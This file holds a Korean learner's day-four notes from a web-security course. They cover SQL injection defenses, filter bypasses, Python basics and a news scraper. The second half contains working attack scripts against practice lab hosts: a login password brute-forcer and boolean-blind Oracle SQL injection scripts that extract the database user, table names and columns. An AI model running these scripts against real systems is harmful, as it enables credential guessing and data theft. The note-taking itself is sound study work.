@@ -1,0 +1,602 @@
+* 4일차 메모
+
+SQL Injection 대응 방안
+
+1. prepared Statement 
+   Statement
+
+test.com/search?name=[검색어]
+
+[Statement]
+
+
+
+@RequestMapping("/search")
+
+public String search(@RequestParam name ) {
+       
+    query = "select 컬럼들 from friends where name like '%" + name '%'";
+    result = db.execute(query)
+    return result;
+
+}
+
+
+[Prepared Statement ]
+
+  query = "select 컬럼들 from friends where name like ? and age = ?";
+  query.bind(1, name);
+  query.bind(2, age);
+  result = db.executePs(query);
+  return result;
+
+ 
+ select 컬럼들 from friends where name like '% 검색어 %'
+
+컬럼 테이블에 파라미터가 들어갈때 PS쓰는데 ? 어쩔꺼냐
+ Yes : 제대로만 알고 쓰면 100% 안전합니다.
+ No  : 아니오 제대로 안쓰면 뚫립니다.
+
+
+ test.com/board/list?board=2&page=1&keyword=eagle
+
+ select * from notice where --
+
+ "select * from " + board + " where keywrod like ? "
+
+ if board = 'notice':
+  query=  "select * from notice where keyword like ?"
+ else if board = "qna";
+  query=  "select * from qna where kwyrod like ?"
+ else :
+   에러처리해  
+ 
+
+ query.bind(1, keyword)
+ 실행
+
+정렬 
+
+test.com/board/list?board=notice&page=1&keyword=검색어&soretBy=age,(case when&sort=DESC
+
+select * from friends where name like ? order by + ;
+
+select table_name from user_tables where <- order by 1 and 2=2
+
+if (조건):
+   참일떄 
+else:
+   거짓일때
+
+case when (조건) then 참일때 else 거짓일때 end
+
+
+(case when 1=1 5 then 1 else 2 end)
+
+
+
+2. 사용자 입력값 필터링
+
+  1) Whitelist Filtering
+   일단 아무것도 못하게 해놓고
+   할수 있는것만 지정
+  
+   10,11,12,13,60,61,62
+  
+
+  2) BlackList Filtering / Blocklist
+    ' select union ctxsys from user information_schema user_tables
+
+eqstore.com/product?id=__
+
+eqstore.com/search?keyword=__검색어
+
+if 'select',"'" in keyword:
+    select지워버려
+    에러처리해
+    
+
+      1] select from 가 들어오면 지워버려 
+
+     for(3바뀌)
+      keyword.replaceAll('select','');
+       
+        select
+
+     2] 탐지 select 
+     if 'select' in 검색어.toLowerCase():
+        에러
+
+       SeLeCt
+    
+    3] 스페이스 못넣게 
+      keyword.replaceAll(' ', '')
+
+      select/**/table_name/**/from/**/user_tables
+
+
+ORA-00932: 일관성 없는 데이터 유형: NUMBER이(가) 필요하지만 CHAR임
+
+https://docs.oracle.com/error-help/db/ora-00932/00932. 00000 -  "expression%s is of data type %s, which is incompatible with expected data type %s"
+*Cause:    The input data type for this SQL operation was incompatible with
+           the expected data type.
+*Action:   Modify the expression to have a compatible data type for the
+           SQL operation.
+*Params:   1) failed_expression
+           type.
+           2) expression_data_type: The data type of the column or expression.
+           3) expected_data_type: The data type expected by the SQL operation.
+1행, 85열에서 오류 발생      
+
+ORA-01476: 제수가 0 입니다
+
+https://docs.oracle.com/error-help/db/ora-01476/01476. 00000 -  "divisor is equal to zero"
+*Cause:    An expression attempted to divide by zero.
+*Action:   Correct the expression, then retry the operation.
+
+ 번외. 자료형 
+
+ eqstore.com/id=61 and 1=1 
+
+ id = int("61")
+ 61
+
+
+* Python 
+
+0. 기본문법
+
+명령의 끝 <- 1개의 line에 1개의 명령
+{}<-
+
+if 조건 {ljkljlkjlkj};
+
+for (조건) {}
+
+a=1
+b=2
+c=a+b
+print(c)
+
+if 조건:
+  참일떄 실행
+  참일때 실행2
+  
+
+1. 선언
+a=1, a='abc', a="abc"
+b="efg"
+
+a+b -> str(a)+b
+
+def 함수명():
+    ㅣㅏㅓㅣㅏㅓ
+    ㅣㅏㅓㅏㅣㅓ
+    ㅣㅏㅓㅣㅏ
+    return
+
+
+
+2. 조건 분기
+
+if (조건):
+    참일떄
+else:
+    거짓일때
+
+
+3. 반복 
+
+a=['q','w','e','r','t','y']
+
+for value in range(1,11):
+    print(value)
+
+4. 입출력
+a = input("검색어 : ")
+print(a)
+
+
+print("1번쨰 테이블의 1번째 글자 아스키 값 : " + ascii)
+
+1) "문자" + str(숫자변수)
+2) "문자 {}   {}  {}".format(숫자변수, 숫자변수2, 숫자변수3)
+3) f"문자 {}"
+
+attackQuery = "(select length(user) from dual) > {}"
+
+attackQuery.format(30)
+
+
+
+1. HTML 껍데기 틀
+
+<html>
+    <head>
+    각종 설정값
+    </head>
+    <body>       
+       <태그></태그> 
+       <태그 />
+       <태그 속성="">
+         속성 : id, name, class, 이벤트 핸들러... ...data
+    화면에 보여줄거
+
+    </body>
+</html>
+
+
+2. Javascript 동적으로 뭔가 작동
+
+var a = 1;
+if(1=1) {
+    참일때
+}else{
+    거짓일떄
+}
+for(var i = 0; i<10;i++) {
+
+}
+console.log(변수)
+prompt()
+
+
+ 1) <script> 코드 </script>
+ 2) test.js 
+    <script src="test.js> </script>
+ 3) 태그 안에서 
+
+
+3. CSS 디자인
+
+ 1) <style> </style>
+ 2) test.css 
+    <link src="test.css">
+ 3) 태그 안에서
+
+
+
+ - 네이버 뉴스에서 기사 제목들 스크랩
+
+
+ pip install requests 
+
+ pip install bs4
+====================================================================
+
+import requests
+from bs4 import BeautifulSoup4
+
+# 웹 페이지 요청
+url = "https://news.naver.com"  # 여기에 실제 URL을 입력하세요.
+response = requests.get(url)
+
+# HTML 파싱
+soup = BeautifulSoup(response.text, 'html.parser')
+
+newstitles = soup.select("#ct > div > section.main_content > div.main_brick > div > div > div > div > a > strong")
+
+for title in newstitles:
+    print(title.text)
+
+
+====================================
+보안뉴스 or 데일리 시큐 뉴스 스크랩
+====================================
+
+기사 제목 크롤러 만들기
+
+====================================
+
+import requests
+
+url = "https://elms2.skinfosec.co.kr:8110/practice/practice02/login"
+
+headers ={
+    "Content-Type" : "application/x-www-form-urlencoded"
+}
+
+cookies = {
+    "JSESSIONID":"자기꺼"
+}
+
+data = {
+    "_csrf":"자기꺼",
+    "memberid":"admin",
+    "password":"1234"
+}
+
+for i in range(700,1000):
+    pw = str(i).zfill(4)
+    data["password"] = pw
+    response = requests.post(url, data=data, headers=headers, cookies=cookies)
+
+    
+    if "권한이 없습니다." in response.text:
+        print("쿠키 csrf 이런거 다시 넣어라!")
+        break
+    if "로그인에 실패" in response.text:
+        print(f"비밀번호 [{pw}] 아님...")
+    else:
+        print(f"비밀번호는 [{pw}]였다!!!")
+        break
+
+
+========================================
+
+
+import requests
+
+url = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62"
+
+
+jk = {
+    "JSESSIONID":"자기꺼"
+}
+
+query = input("공격쿼리 : ")
+attackUrl = url + " and " + query 
+
+#https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and 1=1
+
+res = requests.get(attackUrl, cookies=jk)
+
+if "권한이 없습니다" in res.text:
+    print("쿠키 다시 넣어!")
+
+if "MacBook Pro" in res.text:
+    print("참!")
+else:
+    print("거짓!")
+
+
+==========================================
+
+import requests
+url = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62"
+jk = {
+    "JSESSIONID":"자기꺼"
+}
+
+length = 0
+for i in range(1,100):
+    attackQuery = f"length(user) = {i}"
+    attackUrl = url + " and " + attackQuery
+    res = requests.get(attackUrl, cookies=jk)
+    if "MacBook Pro" in res.text:            
+        print(f"유저명 {i} 글자")
+        length = i
+        break            
+
+for j in range(1,length+1):    
+    for i in range(33,127):       
+        attackQuery = f"ascii(substr(user,{j},1)) = {i}"
+        attackUrl = url + " and " + attackQuery
+        res = requests.get(attackUrl, cookies=jk)
+        if "MacBook Pro" in res.text:            
+            print(f"유저명 {j}번째 글자 {chr(i)}")
+            break        
+
+======================================
+* SQL Injection 문제 5번 Oracle 
+유저명 자동 탈취 스크립트 만들기
+======================================
+1. POST 방식
+2. 필요한 Headers, Cookies 찾아야 됨
+3. 하는 방식은 이전에 쇼핑몰 문제 2번과 같습니다.
+
+SSL error -> verify=False 
+(Warning) -> disable_warning 
+
+========================================
+
+import requests
+
+requests.packages.urllib3.disable_warnings()
+
+url = "https://lab.eqst.co.kr:8442/community6/free"
+
+headers ={
+    "Content-Type" : "application/x-www-form-urlencoded"
+}
+
+cookies = {
+    "JSESSIONID":"7C29BAB3F0BF86B30C20A247F2D9D4B8"
+}
+
+data = {
+    "startDt":"",
+    "endDt":"",
+    "searchType":"all",
+    "keyword":"eagle"
+}
+
+keyword = "eagle%' and {} and 'p%'='p"
+
+length = 0
+for i in range(1,100):
+    query = "length(user) = {}".format(i)
+    data["keyword"] = keyword.format(query)
+    response = requests.post(url, data=data, headers=headers, cookies=cookies, verify=False)
+
+    if 'tiger' in response.text:
+        print(f"유저명 글자수 : {i}글자")
+        length = i
+        break
+
+for i in range(1, length+1):
+    for asc in range(33, 127):
+        query = f"ascii(substr(user,{i},1)) = {asc}"
+        data["keyword"] = keyword.format(query)
+        response = requests.post(url, data=data, headers=headers, cookies=cookies, verify=False)
+        if 'tiger' in response.text:
+            print(f"유저명 {i}번째 글자 :{chr(asc)} ")
+            
+            break
+        
+
+======================
+
+이진 탐색 
+
+85
+
+
+1차.
+1  ~ 127  :  > 64  
+ 참   65 ~ 127 
+
+2차.
+65 ~ 127  :  > 96 
+  거짓  65 ~ 96
+
+3차.
+65 ~ 95   :  > 80   참  81 ~ 95
+
+4차.
+81 ~ 95   :  > 88   거짓 81 ~ 88
+
+5차.
+81 ~ 88   :  > 84   참   85~88
+
+6차
+85~88     :  > 86   거짓 85~86
+
+7차
+85~86     :  > 85   거짓 85~85
+
+
+============================
+
+asc = int(input("숫자 입력 : "))
+
+start = 1
+end = 127
+
+cha = 1
+
+while start < end:
+    mid = int((start+end)/2)
+    print(f"{cha}차.")
+    cha = cha + 1
+    print(f"{start} ~ {end} : > {mid}")
+    if asc > mid:
+        start = mid + 1     
+        print(f"참 {start} ~ {end}")
+    else:
+        end = mid 
+        print(f"거짓 {start} ~ {end}")
+print(f"아스키 코드 : {end}였다.")
+
+
+====================================================
+
+import requests
+url = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62"
+jk = {
+    "JSESSIONID":"AB30F6B51162C1E7AA6C0180C03241C2"
+}
+
+length = 0
+for i in range(1,100):
+    attackQuery = f"length(user) = {i}"
+    attackUrl = url + " and " + attackQuery
+    res = requests.get(attackUrl, cookies=jk)
+    if "MacBook Pro" in res.text:                    
+        length = i
+        break            
+
+user = ""
+for j in range(1,length+1):            
+    start = 1
+    end = 127
+    while start < end:
+        mid = int((start+end)/2)    
+        attackQuery = f"ascii(substr(user,{j},1)) > {mid}"
+        attackUrl = url + " and " + attackQuery
+        res = requests.get(attackUrl, cookies=jk)        
+        if "MacBook" in res.text:
+            start = mid + 1                
+        else:
+            end = mid 
+    user = user + chr(start)
+    print("유저명 : " + user)
+    
+
+===================================
+import requests
+url = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62"
+jk = {
+    "JSESSIONID":"자기꺼"
+}
+
+def binarySearch(query):
+    start = 1
+    end = 127
+    while start < end:
+        mid = int((start+end)/2)    
+        attackQuery = f"({query}) > {mid}"
+        attackUrl = url + " and " + attackQuery
+        res = requests.get(attackUrl, cookies=jk)        
+        if "MacBook" in res.text:
+            start = mid + 1                
+        else:
+            end = mid 
+    return start
+
+
+# 3. 테이블 명 
+# select table_name from user_tables 
+# 3-1. 테이블의 개수 : 
+# select count(table_name) from user_tables 
+query = "select count(table_name) from user_tables"
+tableCount = binarySearch(query)
+print(f"테이블 개수 : {tableCount}개")
+
+# 3-2. 테이블 1 row 씩
+#  select table_name from (select table_name, rownum ln from user_tables) where ln = {}
+# 3-2-1. 1 row의 글자수
+#  select length(table_name) from (select table_name, rownum ln from user_tables) where ln = {}
+
+for ln in range(1, tableCount + 1):
+    query = f"select length(table_name) from (select table_name, rownum ln from user_tables) where ln = {ln}"
+    tableLength = binarySearch(query)
+    print(f"{ln}번째 테이블명의 글자수 : {tableLength}글자")
+# 3-2-2. 한글자씩 아스키 
+#  select ascii(substr(table_name,{},1)) from (select table_name, rownum ln from user_tables) where ln = {}
+    tableName = ""
+    for substr in range(1, tableLength + 1):
+        query = f"select ascii(substr(table_name,{substr},1)) from (select table_name, rownum ln from user_tables) where ln = {ln}"
+        tableName = tableName + chr(binarySearch(query))
+    print(f"{ln}번째 테이블 명 : {tableName}")
+
+#member 테이블의 컬럼명들 뽑기
+# 4. MEMBER 테이블의 컬럼 정보 추출
+# 4-1. 컬럼 개수 확인
+query = "select count(column_name) from user_tab_columns where table_name = 'MEMBER'"
+columnCount = binarySearch(query)
+print(f"MEMBER 테이블의 컬럼 개수: {columnCount}개")
+
+# 4-2. 각 컬럼명 추출
+for ln in range(1, columnCount + 1):
+    # 4-2-1. 컬럼명의 길이 확인
+    query = f"select length(column_name) from (select column_name, rownum ln from user_tab_columns where table_name = 'MEMBER') where ln = {ln}"
+    columnLength = binarySearch(query)
+    print(f"{ln}번째 컬럼명의 길이: {columnLength}글자")
+    
+    # 4-2-2. 컬럼명 한 글자씩 추출
+    columnName = ""
+    for substr in range(1, columnLength + 1):
+        query = f"select ascii(substr(column_name,{substr},1)) from (select column_name, rownum ln from user_tab_columns where table_name = 'MEMBER') where ln = {ln}"
+        columnName = columnName + chr(binarySearch(query))
+    print(f"{ln}번째 컬럼명: {columnName}")
+    
+    # 4-3. 컬럼 데이터 타입 확인 (선택적)
+    query = f"select length(data_type) from (select data_type, rownum ln from user_tab_columns where table_name = 'MEMBER') where ln = {ln}"
+    typeLength = binarySearch(query)
+    
+    dataType = ""
+    for substr in range(1, typeLength + 1):
+        query = f"select ascii(substr(data_type,{substr},1)) from (select data_type, rownum ln from user_tab_columns where table_name = 'MEMBER') where ln = {ln}"
+        dataType = dataType + chr(binarySearch(query))
+    print(f"{ln}번째 컬럼 데이터 타입: {dataType}")
